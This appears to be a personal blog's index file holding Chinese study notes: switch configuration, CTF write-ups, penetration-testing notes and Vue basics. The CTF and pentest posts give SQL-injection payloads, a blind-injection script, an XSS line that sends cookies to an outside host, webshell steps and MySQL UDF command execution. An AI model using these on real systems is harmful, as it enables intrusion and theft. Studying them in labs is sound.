{"meta":{"title":"fxxy","subtitle":"","description":"力争下游。","author":"fxxy","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2021-10-22T09:48:59.000Z","updated":"2021-10-22T09:52:15.629Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"link","date":"2021-10-22T09:49:12.000Z","updated":"2021-10-22T09:49:12.713Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":""},{"title":"category","date":"2021-10-22T03:54:08.425Z","updated":"2021-10-22T03:54:08.403Z","comments":true,"path":"category/index.html","permalink":"http://example.com/category/index.html","excerpt":"","text":""},{"title":"about","date":"2021-10-22T09:50:16.000Z","updated":"2021-10-22T09:50:16.531Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""}],"posts":[{"title":"网络设备期末","slug":"网络设备","date":"2020-06-26T16:00:00.000Z","updated":"2021-10-22T08:34:41.328Z","comments":true,"path":"2020/06/27/网络设备/","link":"","permalink":"http://example.com/2020/06/27/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/","excerpt":"网络设备配置期末复习笔记。。","text":"网络设备配置期末复习笔记。。 配置三层交换机123456789101112131415# 三层交换机与其他交换机联通ip routing int 与交换机连接的接口switchport trunk encapsulation dot1qswitchport mode trunk# 配置网关 联通其他vlanint vlan 2ip address 26.1.2.1（网关） 255.255.255.0no shutdown# 配置自己的vlan时是用自己的IP 其他事网关 端口聚合1234interface port-channel 1interface range f0/switchport mode trunkchannel-group 1 mode on s12345678access-list 101 peimit tcp 26.1.2.0（不被允许的机器） 0.0.0.255 host 26.1.4.7(服务器) eq wwwaccess-list 101 peimit tcp 26.1.2.0（不被允许的机器） 0.0.0.255 host 26.1.4.7(服务器) eq wwwsource-list 101 permit icmp anyint f0/ip access-group 101 in / out 设置生成树 打开生成树协议（只在三层交换机中设置） 12spanning-tree vlan 1 (默认为1)spanning-tree mode rapid-pvst 关闭vlan的生成树协议 1no spanning-tree vlan 10 //把自己创建的vlan关了 设置三层交换机为根交换机 1spanning-tree vlan 1 root primary 配置ospf交换机相连的端口需改为trunk模式，两台三层交换机设置为一个网段的IP，加一个公用的vlan100，再设置端口 int vlan 100ip address 26.1.100.1（路由IP） 255.255.255.0no shutdown //作用于两台三层交换机，使两端互通 123456router ospf 1# 分别将每个vlan的IP加进来network 26.1.2.0 0.0.0.255 area 0删除no network 设置静态路由需要先配置s0/2的IP ospf使各个端口可以联通 内网出去 1ip route 201.168.1.0(需要访问的外网服务器IP) 255.255.255.0（网关） 26.1.2.254 （下一个路由） NAT配置内外网12345int s2/0 ip nat outsideint f0/0ip nat inside 配置动态路由123access-list i peimit 26.1.2.0 0.0.0.255nat pool 1(代理池名称) 200.168.1.10(最小网段) 200.168.1.20(最大网段) netmask 255.255.255.0ip nat inside source list 1 pool 1 配置telnet 过滤123456access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 10.2.63.3 eq 22access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 10.2.63.3 eq 23access-list 101 permit ip any any int s0/0/0ip access-group 101 inexit 配置http、ftp过滤1234567access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 192.168.63.100 eq wwwaccess-list 101 deny tcp 172.16.63.0 0.0.0.255 host 192.168.63.100 eq ftpaccess-list 101 permit ip any anyint s0/0/0ip access-group 101 inexit","categories":[],"tags":[]},{"title":"BUUctf平台","slug":"buuctf刷题","date":"2020-06-09T16:00:00.000Z","updated":"2021-10-22T08:34:14.870Z","comments":true,"path":"2020/06/10/buuctf刷题/","link":"","permalink":"http://example.com/2020/06/10/buuctf%E5%88%B7%E9%A2%98/","excerpt":"刷的一些题","text":"刷的一些题 [HCTF 2018]WarmUpf12源码看到source.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; //声明白名单为source.php hint.php $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; //截取file字段中，开头到出现?的部分 $_page = mb_substr( $page, 0, //？在file字段中首次出现的位置 mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); // $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 先搞清楚代码，$_REQUEST[‘file’]获取请求中的file查询参数，然后用checkFile()进行检查，是否是hint.php或者source.php，若是这两个php则输出相应内容 利用点在这2个地方 123456789101112$_page = mb_substr( $page, 0, //？在file字段中首次出现的位置 mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); mb_substr()：对字符串进行截取 mb_strpos()：查找指定字符串在被查找字符串中第一次出现的位置，注意噢！是第一次出现的位置，而且在查找时，他会自动给原字符串的末尾加上? 在本地写个demo看一下 正常时： 不正常时： 也就是说，不管我后面会加多少个问号，多少个参数，他最终截取出来比对的，只会是第一个?出现之前的内容，这里可以这样绕过 1?file=source.php?payload 然后hint.php中说，flag在ffffllllaaaagggg中，下面依次向上便利目录 在第四次的时候出来了 1?file=hint.php?/../../../../ffffllllaaaagggg [强网杯 2019]随便注 注入点: 1http://07494cc4-964e-492d-82b1-180e7cc2beef.node3.buuoj.cn/?inject=1&#x27; -- - 字段值为2 但是过滤了一些东西，过滤了select，update，delete，drop，insert，where且大小写绕不过 用报错注入试试获取数据库和用户 数据库：supersqli 用户：root@localhost 过滤了很多关键词，下面不知道怎么办了，然后在山师傅的提醒下，用了堆叠注入。 获取数据库 获取数据表 1http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show tables; -- - 获取字段名 12http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show columns from words -- -http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show columns from `1919810931114514` -- - flag肯定是在1919810931114514这个表里面，但是过滤select又不知道该咋办了，看了一下WP，一种方法是置换表名和列名，因为正常查询的语句肯定为 1select * from word where id = &#x27;&#x27; 那如果我们把存有flag的表名换成word就可用 1alter table words rename to words1;alter table` 1919810931114514` rename to words;alter table words change flag id varchar(50); -- - [SUCTF 2019]EasySQL过滤字符 “ and or order union like 堆叠注入 获取数据库 test ctftraining 1query=1;show databases; 本来想一个一个试一下每个数据库中都有哪些表的，但是 1query=1;use test;show tables; 这个语句不能执行，那就show一下当前这个数据库有什么表叭 1query=1;show tables; 尝试获取列名称 1show columns from falg 又被过滤了。。。 思考：flag表就在这个数据库下面，说明我们要的东西就在这里，前面测试的时候，不管输入的query是多少，输出的都只有1猜测后端的sql语句为 1select 1 from flag 我们想得到flag表的内容的话，语句应该为 1select * from flag 构造一下，query=*,1这样语句就会变为 1select *,1 from flag 然后成功得到flag 错误 官方WP里的做法是这样的，用了一个sql_mode变量，本来的查询语句应为 1select $POST[&#x27;query&#x27;] || flag from flag; 正常的话，他应该是这样 而且前面测试的时候发现，有黑名单过滤输入字符串时会出错，而且输入的正确的东西时，回显的永远是1，那这样上面那个语句也说的通了，如何利用？ mysql中有个sql_mode变量，这个变量有个值，是pipes_as_concat。意思就是将管道符当作连接符，将给定的字符拼接到查询的变量，测试一下 所以，正确解法应该是 1query=1;set sql_mode=pipes_as_concat;select 1 可以看到对1进行了拼接。 极客大挑战 easysql注入点在username参数 1?username=1&#x27; or 1=1 order by 4 -- - 字段数：3 一番测试发现布尔盲注 写脚本注出数据库为geek 数据库名 表名 后来用这个geekusser注列名的时候，折腾了好久都没有，然后在浏览器进行测试的时候，一不小小出来了。。。我把表名改成了geekuser 1http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;geekuser&#x27; limit 0,1),1,1))&lt;125,1,0) -- - &amp;password=1&#x27; or 1=1 那让我们正常注一下 列名 id username password 脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestszidian = &#x27;sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\\;&#123;$%&amp;*()&#125;&#x27;url = &quot;http://127.0.0.1/sqli/Less-6/?id=1&quot;def get_res(): result = &#x27;&#x27; for i in range(1,10): for j in zidian: print(j) #获取数据库名 #payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- -&amp;password=1&#x27; or 1=1 &quot;.format(i,ord(j)) #获取数据表名 控制limit获取其他表 #payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- - &amp;password=1&#x27; or 1=1 &quot;.format(i,ord(j)) #获取字段名 #payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;geekuser&#x27; limit 3,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- - &amp;password=1&#x27; or 1=1&quot;.format(i,ord(j)) #获取字段值 payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select password from geekuser limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- - &amp;password=1&#x27; or 1=1&quot;.format(i,ord(j)) print(payload) flag = requests.get(payload) if &quot;Success&quot; in flag.text: result = result + j print(result) print(result) #return resultprint(get_res())# payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select database()),1,1))=115,1,0) -- -&#x27;# flag = requests.get(payload)# print(flag.text)# if &quot;You are in&quot; in flag.text:# #dbname += j# print(45678) [RoarCTF 2019]Easy Calc表面上是个计算题。。 看源码发现有个calc.php 访问一下，看到源码 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 有个eval函数！！！但是要绕过前面的限制，num变量中不能包含空格、斜杠等 而且，测试了一下，当num变量为字符串时，会forbidden。。原网页代码中有句话，有waf。。 不会了，看了一下网上的WP，知道了一个PHP解析漏洞。 php解析漏洞 当PHP将查询字符串（在URL或正文中）转换为内部$_GET[‘’]或$__POST[]关联数组时，在将查询字符串进行解析时，会将某些字符删除或用下划线替代，也就是说，当输入 %20num (%20为空格的URL编码)时，在PHP进行解析时，会自动解析为num 例子1 test.php 12345&lt;?php $str = $_GET[&#x27;test&#x27;]; echo $str;?&gt; 参见文章：https://www.anquanke.com/post/id/181682 现在我们有绕过WAF的方法 1?%20num=phpinfo() 扫描根目录下的文件，但是/被过滤了，可以用chr(47)绕过，47是/的ascii码 1?%20num=var_dump(scandir(chr(47))) payload 1? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) [HCTF 2018]admin","categories":[],"tags":[]},{"title":"渗透测试学习笔记","slug":"渗透测试学习笔记","date":"2020-04-29T16:00:00.000Z","updated":"2021-10-22T08:35:17.659Z","comments":true,"path":"2020/04/30/渗透测试学习笔记/","link":"","permalink":"http://example.com/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"笔记。","text":"笔记。 步骤 前期交互 确定项目机范围 信息收集 收集目标相关的资产信息，包括域名、IP、邮箱、防御等 威胁建模 利用已经收集的信息对目标资产进行分析，获取其可能存在的威胁，并规划攻击路径 漏洞分析 发现目标系统中存在的漏洞 漏洞利用 对已发现的漏洞使用攻击向量进行攻击 后渗透 建立立足点，进行权限维持以及内网渗透，获取指定的渗透目标数据，权限等。清理痕迹 报告 编写渗透测试报告 信息收集信息收集的越多，意味着攻击的范围越广 常见关键信息 域名、子域名 IP及端口 域名历史解析IP 应用服务系统、版本 开源情报 服务端框架，语言 IP反向查询域名 自动化工具内置在kali中 Maltego：https://www.paterva.com Maltego 教程：https://www.jianshu.com/p/93ab0265375b Recon-Ng：https://bitbucket.org/LaNMaSteR53/recon-ng.git Recon-Ng 教程：https://www.freebuf.com/sectool/141544.html theHarvester：https://github.com/laramies/theHarvester theHarvester 教程：https://cloud.tencent.com/developer/news/47698 漏洞发现主要以下四个方面 传统漏洞 利用通用漏洞 弱口令等目标脆弱点 代码审计 渗透SQL注入 寻找注入点 注入方式 XSSbluecms 找后台 手工：admin、manage 工具：御剑 &lt;img/src=x&gt; &lt;svg/onload=x &gt; alert(1) 1&lt;script&gt;new Image().src =&quot;http://www.domin.com?log.php?c=&quot; + encodeURI(document.cookie);&lt;/script&gt; 绕过长度限制 引入外部脚本 短链接 dwz.cn 步骤 发现xss利用点 构造xss paload获取管理员cookie 利用管理员cookie进行管理页面登录 登陆后后台查看有无上传文件权限进行webshell上传 另外可借助一些XSS平台监听放的【钓鱼链接】 数据库权限mysql 写webshell select into outfile UDF提权 MOF提权 配置phpmyadmin日志获取webshell general log general log file 记录sql查询记录，默认在./data目录下 sqlserver 存储过程执行命令 sql写入webshell条件 当前数据库用户有文件读写权限 须配置 secure_file_priv 知道绝对路径且可写可执行 单双引号可以正常使用 获取绝对路径方式 报错信息 phpinfo、探针等文件 常规目录 练习：blucms admin/nav.php 若文件夹无可写权限，可通过文件上传寻找可写入路径 hex编码绕过，这样可不用引号把内容括起来 练习靶场 http://47.106.80.112:8235/ 提权目录扫描工具 御剑 OWASP dirbrute burpsuite webpathbrute mysql提权 UDF提权 MOF提权 UDF提权 实战5：udf提权 Userdefined Function：是用户自定义函数，mysql为用户提供的一个扩展功能的接口，用户可以通过编写代码的方式编译成.so.dll文件，使用自定义函数 使用条件 mysql &gt; 5.1 .so .dll文件必须放在mysql的plugin目录下 有create function权限 获取plugin目录：@@plugin_dir 此种方法Windows下易用 工具地址：lib_mysqludf_sys：https://github.com/mysqludf/lib_mysqludf_sys 先将仓库clone到本地 1git clone https://github.com/mysqludf/lib_mysqludf_sys 生成exp 1gcc -Wall -l /www/mysql/include -Os -shared lib_mysqludf_sys.c -fPIC -o udf.so 将生成的文件十六进制编码 1select hex(load_file(&#x27;/tmp/udf.so&#x27;)) 获取plugin目录 1select @@plugin_dir 写入内容 1select unhex(&#x27;第三步hex的内容&#x27;) into dump file &#x27;plugin_dir/udf.so&#x27; 进行函数声明与udf.so相关联 1create function sys_eval returns string soname &#x27;udf.so&#x27; 执行 1select sys_eval(&#x27;pwd&#x27;); 痕迹销毁 1drop function sys_eval redis提权 定时任务 写入ssh 业务逻辑漏洞逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，而导致一些逻辑分支不能够正常处理或处理错误。 一般有以下几种情况 密码找回 任意密码修改（没有旧密码认证） 越权访问 API调用 交易支付过程 …… 权限控制类平行越权 相同权限用户之间的操作权限控制不当 一个正常的用户a通常只能对自己的信息进行修改，但由于系统未对信息修改进行一个判断，判断当前操作是否属于对应的用户的操作，导致用户a可以操作其他人的信息。 防护：增加访问与操作对象的用户属性，在对目标对象进行访问与操作时，服务端校验会话与对象的用户属性，在校验通过后才能执行读取和操作。 垂直越权 不同权限用户之间权限控制不当，多发生再低权限用户访问高权限用户资源 例子：在博客论坛中，一个正常的普通用户a，通过burpsuite抓包修改自己的用户ID为管理员的用户ID，使其成功登录了管理员的帐号。 防护：所有访问采取默认拒绝机制，采取基于角色访问控制，对于各个功能的访问，规定不同角色拥有不同的访问权限，当用户在使用该功能时，系统要校对用户的权限和访问控制机制是否与规定相同，通过校对者才能使用，否则拒绝使用该功能。 接口控制 特殊接口没有做访问权限控制 例子：在博客论坛中，一个正常的普通用户a使用官方提供的API接口构造链接，用户b通过点击该链接后进行发送或转发用户a指定的内容。 接口类漏洞大多数都是因为接口没有做验证或者其他预防机制，导致被攻击者所利用，比如一些下载链接接口导致未授权下载，登录接口无验证导致撞库等等。 修复建议 基础安全架构，完善用户权限体系。要知道哪些数据对于哪些用户，哪些数据不应该由哪些用户操作 鉴权，服务端对请求的数据和当前用户身份做校验 不要直接使用对象的实名或关键字 对于可控参数进行严格的检查与过滤 密码修改找回类https://untitled-0on9w2imekga.runkit.sh/login? 正常逻辑下，密码重置、密码找回需要以下三个条件 用户名 身份证号码 手机短信验证码 然而某些验证不严密的，身份证号和手机短信验证码均可绕过，只需要知道用户名就可以重置任意用户密码 凭证可破解 利用点：爆破验证码 https://untitled-tthv7pk5xegg.runkit.sh/index? 凭证可获取 开发人员将验证信息包含在响应包中 token可猜解 前端校验 在前端进行验证，相当于没有进行任何防范措施，比如登陆状态如果只以登陆状态码进行判断登陆成功标识，那么修改登陆状态码就能进行登录。 前端包含对验证码的校验flag，可控 步骤可跳过 通过跳过某些关键步骤来达到修改别人密码的目的。 支付逻辑类 支付过程中可以直接修改数据包中的支付金额 没有对购买数量进行复数限制 请求重放：通过多线程同一时间发送大量请求，当数据库未加锁时出错（条件竞争） 参数干扰：优惠券，同一代金券重复使用，为满足条件使用代金券 通用漏洞 定义：企业及互联网中常用的操作系统，系统组件，重要的框架以及应用中的安全漏洞 PoC：指一段漏洞证明的代码 CMS识别：云溪 WAF绕过分类 云WAF CDN WAF 主机WAF 绕过思路 云waf cdn WAF绕过：尝试直接访问主站 主机WAF：通过内容绕过 大小写 内联注释 换行符","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"vue笔记","slug":"vue笔记","date":"2020-03-13T16:00:00.000Z","updated":"2021-10-22T08:32:32.158Z","comments":true,"path":"2020/03/14/vue笔记/","link":"","permalink":"http://example.com/2020/03/14/vue%E7%AC%94%E8%AE%B0/","excerpt":"…..","text":"….. ES6属性 速写属性 1234567var name = &#x27;abc&#x27;;var age = 123;var obg=&#123; name; //以前写法为name = name; age;&#125; 箭头函数 12345678var obj = &#123; &#125;var func = (a,b) =&gt; a + b;var func1 = a =&gt; a + 2;func(4,5); //9func1(2); //4 实例通过new Vue({….})创建实例 配置对象中的内容会提取到实例中： data：数据 props template：字符串，配置模板 methods：方法 computed：配置计算属性 计算属性和方法的区别：计算属性使用时，时当作属性使用 计算属性会进行缓存，如果依赖不变，则会直接使用缓存结果，不会多次进行计算 挂载让vue实例控制页面中某个区域的过程，称之为挂载 方式： 通过el:”css选择器”进行配置，el:”#app” 通过vue实例，app.$mount(‘css选择器’)进行配置 模板被VUE控制的页面片段 作用： 提高渲染效率，vue会把模板渲染成虚拟DOM 树，然后再生成真实DOM 树 书写在哪： 在挂载元素中直接书写 在template中书写 在render配置中用函数创建 模板中写什么 静态内容 插值： 指令 v-bind：绑定属性。innerHTML v-on：绑定事件。简写：@ v-if：判断元素是否需要渲染 v-show：判断元素是否应该显示 v-if 是动态添加，当值为 false 时，是完全移除该元素，即 dom 树中不存在该元素。 v-show 仅是隐藏 / 显示，值为 false 时，该元素依旧存在于 dom 树中。若其原有样式设置了 display: none 则会导致其无法正常显示。 v-for：循环遍历，就地更新，如果元素的值发生改变，不会移动dom节点进行更新，而是根据绑定的key值进行更新。 v-bind:key：用于帮助在重新渲染时元素的比对，通常和v-for配合使用，提高渲染效率 v-model：实现双写绑定，自动绑定value属性值，并注册input事件 v-once：执行一次性地插值，当数据改变时，插值处的内容不会更新 v-html：渲染输出绑定的html代码 组件ES模块化导出1234567891011//默认导出export default function(a,b)&#123; return a+b;&#125;//具名导出 &#123; double:fn&#125;export function double(a)&#123; return a*2;&#125;//&#123;n : 3&#125;export var n = 3; 导入须先在文件中导出才能导入 12345import xxx from &#x27;js文件路径&#x27; //导入路径文件中的defaultimport &#123;double&#125; from &#x27;js文件路径&#x27; //具名导入import * as obj = from &#x27;js文件路径&#x27; //导入全部 组件概念组件化，即把每一个页面中区域功能细分，每一个区域成为一个组件，每个组件包含： 功能（JS代码） 内容（模板代码） 样式（CSS代码） 创建组件组件是根据一个普通的配置对象创建的所以要开发一个组件， 1234567891011var myApp = &#123; data()&#123; return&#123; ...... &#125;; &#125;, method:&#123; &#125;&#125;.$mount(&#x27;#app&#x27;) 注意，组件中无el元素，用$mount进行挂载 data属性是函数模式 注册和使用组件 全局注册在main.js中 1Vue.component(“使用名”,导入名称) 局部注册1234567891011//使用&lt;componentName/&gt;//在view文件夹中import componentName from app.viewnew Vue(&#123; components:&#123; componentName; &#125;&#125;) 组件命名规范 大驼峰命名法（可用短横线方式调用）： = 短横线命名法 组件树组件之间传递数据 props数组：声明可以接受的数据 传递数据的组件 12345678910&lt;user-info v-for=&quot;(item,i) in users&quot; :key=&quot;i&quot; :name=&#x27;item.name&#x27; &gt;new Vue(&#123; data:&#123; users:[ &#123;name:123&#125;, &#123;name:456&#125; ], &#125;,&#125;) 接收数据的组件 1234567&lt;div&gt; &lt;p&gt;&#123;name&#125;&lt;/name&gt;&lt;/div&gt;new Vue(&#123; props:[&#x27;name&#x27;] &#125;) 生命周期 beforeCreate： created：app实例被挂载之前，获取数据 beforeMount：实例挂载之前 mounted：实例挂载之后 beforeDestory：销毁前 destoryed：实例销毁后 模板语法 格式： 1&#123;&#123; &#125;&#125; 可支持的内容： 1.用户自定义的数据，需通过v-bind绑定到节点上 2.js全局变量，如join函数，date函数等 js表达式（不能是语句或者流控制句） 123456789//可以&#123;&#123; number + 1 &#125;&#125;&#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;//不可以&#123;&#123; var a = 1 &#125;&#125;&#123;&#123; if (ok) &#123; return message &#125; &#125;&#125; vue-cli12345# 安装npm i -g @vue-cli# 创建项目vue create my-project 工程结构 node_modules：项目依赖的第三方库 public src：自己写的代码 main.js：入口文件 assets：存放静态文件，img等 运行 1234# 打包生成npm run build# 运行npm run serve element-ui12# 安装npm i element-ui -S 引入 12345678910111213# 完整引入 main.js中import ElementUI from &#x27;element-ui&#x27;import &#x27;element-ui/lib/theme-chalk/index.css&#x27;;Vue.use(ElementUI);# 局部引入 main.js中import &#123; Button, Select &#125; from &#x27;element-ui&#x27;;Vue.component(Button.name, Button);Vue.component(Select.name, Select); router 基本格式 路由文件中 1234567891011import VueRouter from &#x27;vue-router&#x27;Vue.use(VueRouter)const routes = []const router new VueRouter(&#123; routes&#125;)export default router 一些特性 router.push() 12345678this.$router.push(&#x27;home&#x27;) //跳转到指定路径const userId = &#x27;123&#x27;router.push(&#123; name: &#x27;user&#x27;, params: &#123; userId &#125;&#125;) // -&gt; /user/123router.push(&#123; path: `/user/$&#123;userId&#125;` &#125;) // -&gt; /user/123// 这里的 params 不生效router.push(&#123; path: &#x27;/user&#x27;, params: &#123; userId &#125;&#125;) // -&gt; /user router.go(n)：在history模式中前进或后退，相当于forward和back 导航守卫判断是否有权限访问相关页面 12345678910111213router.beforeEach((to,from,next) =&gt;&#123; //to将要访问的路径 //from代表从哪个页面访问的 //next 是一个函数，表示放行，即送到to的地址 if (to.path === &quot;/login&quot;) return next(); //获取token const tokenStr = window.sessionStorage.getItem(&#x27;token&#x27;); //如果token为空，则送到登录界面 if(!tokenStr) return next(&#x27;/login&#x27;); //若不为空，则送到to next()&#125;)","categories":[],"tags":[{"name":"vue","slug":"vue","permalink":"http://example.com/tags/vue/"}]},{"title":"强网杯2019-upload","slug":"强网杯2019 upload 复现WP","date":"2020-01-22T16:00:00.000Z","updated":"2021-10-22T08:34:46.489Z","comments":true,"path":"2020/01/23/强网杯2019 upload 复现WP/","link":"","permalink":"http://example.com/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20upload%20%E5%A4%8D%E7%8E%B0WP/","excerpt":"强网杯2019 upload 复现WP 分析整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。 发现cookie是一串base64的加密字符串，解密后是一串序列化字符串.","text":"强网杯2019 upload 复现WP 分析整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。 发现cookie是一串base64的加密字符串，解密后是一串序列化字符串. 首先想到的是反序列化，但是反序列化一般都需要源码，所以试了www.zip和www.tar.gz，下载了源码。 全局搜索unserilize函数和serialize函数，发现分别在profile.php和index.php中。 12index.php unserialize() //对cookie进行反序列化操作 profile.php serialize() 全局搜索魔法函数 123__desstruct() Register.php -&gt; class Register__call() profile.php -&gt; class profile__get() profile.php -&gt; class profile 梳理一下这几个魔法函数在php反序列化中的作用 __destruct()：调用unserialize()函数时会自动触发这个函数 __call()：当被调用的方法不在此类中时，会触发这个函数 __get()：当调用的属性不在此类中时，将触发这个方法 分别列举出这几个函数看一下： 1234567Register.phppublic function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; 会调用check中的index方法。 12345678910111213profile.php public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; 结合题目场景，用文件上传一个木马，然后菜刀连接getshell获取flag，但是上传的图片木马会被改名，另外梳理一下源代码逻辑，找一下文件操作代码 12345678910111213141516171819202122232425262728profile.php public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125; 梳理一下这段代码的作用 1.检查是否登录 。this-&gt;checker=0时则不进入此判断。 2.检查流量包中是否存在$_FILE，存在则会进入ext_check()进行判断，看一下etc_check()的代码 123456789public function ext_check()&#123; $ext_arr=explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext==&quot;png&quot;)&#123; return 1; &#125;else&#123; return 0; &#125;&#125; 发现这段代码就是判断文件是否为png文件，我们需要绕过这个判断，由文件上传的知识可以知道，当用GET方式上传文件时，$_FILE这个全局变量是为空的，所以这里可以用GET访问绕过 如果ext为1，则进行相应的文件操作在后面的构造中，将ext设为1即可。 12@copy($this-&gt;filename_tmp, $this-&gt;filename); //复制文件@unlink($this-&gt;filename_tmp); 关键操作在第3点：用copy函数，将filename_tmp的值覆盖原来的文件名，这里就是我们最终想要操作的地方，由前面可知，我们上传的木马被改名且不可用，我们的突破点是将被改了名的文件改成我们希望的文件名。所以，终极目标是：触发profile中的img_upload()方法，且绕过进入文件操作前面的那些判断。 首先明确这个操作在profile类中 第一，我们的序列号字符串中需要一个profile类来通过一些手段来触发这个函数。 第二，如何才能触发这个类中的方法？关注_ call()、 _ _get() 、 destruct()这三个函数 首先看__destruct()函数： 1234567Register.phppublic function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; 会调用checker中的index方法，那么我们怎么才能利用这个函数来呢？首先是解决如何触发profile中的魔术方法 再看__call() 123456public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; 